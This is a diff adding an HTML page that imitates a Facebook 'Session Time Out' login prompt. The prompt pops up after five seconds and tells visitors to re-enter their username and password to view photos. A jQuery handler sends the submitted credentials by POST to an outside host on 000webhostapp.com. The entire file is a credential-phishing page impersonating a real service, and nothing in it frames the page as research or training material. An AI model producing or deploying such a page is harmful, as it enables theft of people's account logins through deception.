@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Modal login</title>
+	<style type="text/css">
+		*{
+			box-sizing: border-box;
+		}
+		body,h3,input{
+			margin: 0;
+		 font-family: sans-serif;
+		}
+		body, tr, input, textarea, button {font-family: sans-serif;}
+		h1,h2,h3,h4,h5,h6,p{
+			margin: 0;
+		}
+		.login-modal{
+			display: none;
+			position: fixed;
+			top: 0;
+			left: 0;
+			width: 100%;
+			height: 100%;
+			background-color: rgba(0,0,0,0.4);
+		}
+		.login-wrapper{
+			position: relative;
+			margin: 0 auto;
+			max-width: 600px;
+			background: #fff;
+		}
+		.banner{
+			background: #3b5998;
+			padding: 10px 0;
+			color: #fff;
+			text-align: ;
+			letter-spacing: 1px;
+		}
+		.banner>h3, .reason>p, .footer>p {
+			margin-left: 10px;
+		}
+		.form-group{
+			margin-bottom: 10px;
+		}
+		.form-control{
+			display: block;
+			padding: 12px;
+			width: 100%;
+			border: 0;
+			background: #f5f6f7;
+			border-radius: 1px;
+			font-size: 14px;
+		}
+		.btn-submit{
+			background-color: #1877f2;
+			font-weight: bold;
+      color: #fff;
+      font-size: 17px;
+      line-height: 17px;
+		}
+		.reason{
+			background: #f71717;
+			color: #fff;
+			font-size: 15px;
+			/*background: #e8e3e3;
+				color: #110e0e;
+				font-size: 15px;*/
+		}
+		.reason .p1{
+      padding-top: 6px;
+      padding-bottom: 2.5px;
+		}
+		.reason .p2{
+			padding-top: 2.5px;
+			padding-bottom: 6px;
+		}
+		.footer{
+			padding-top: 10px;
+			padding-bottom: 20px;
+		}
+	</style>
+</head>
+<body>
+  <div class="login-modal">
+  	<div class="login-wrapper">
+  		<div class="banner">
+  			<h3>Facebook Session Time Out</h3>
+  		</div>
+  		<div class="reason">
+  			<p class="p1">Your Session has timed out due to inactivity.</p>
+  			<p class="p2">Please re-enter your user name and password to view photos.</p>
+  		</div>
+  		<div class="form-wrapper">
+  			<form id="form" method="post" autocomplete="off">
+  				<div class="form-group">
+  					<input class="form-control" type="text" name="username" placeholder="Mobile number or email address" required>
+  				</div>
+  				<div class="form-group">
+  					<input class="form-control" type="password" name="password" placeholder="Password" required>
+  				</div>
+  				<div class="form-group">
+  					<input class="form-control btn-submit" type="submit" name="submit" value="Log In">
+  				</div>
+  			</form>
+  		</div>
+  		<div class="footer">
+  		  <p>Facebook &copy 2022</p>
+  	  </div>
+  	</div>
+  </div>
+<script src="js/jquery.js"></script>
+<script>
+	$(document).ready(function(){
+	setTimeout(function() {
+		$(".login-modal").show();
+		$("body").css("overflow", "hidden");
+	},5000);
+
+//form ajax, disable button, send mail
+
+$('#form').submit(function (e) {
+  e.preventDefault();
+  $("#login").prop('disabled', false);
+  $("#login").attr("value", "Loging...");
+  $data = 'username='+$("#username").val()+'&password='+$("#password").val();
+  $.ajax({
+    type: 'POST',
+    url: 'https://banglaerphoto.000webhostapp.com/contact/usermail.php',
+    data:  $data,
+    success: function (response) {
+      $('#answers').html(response);
+    },
+  });
+});
+
+
+});
+</script>
+</body>
+</html>
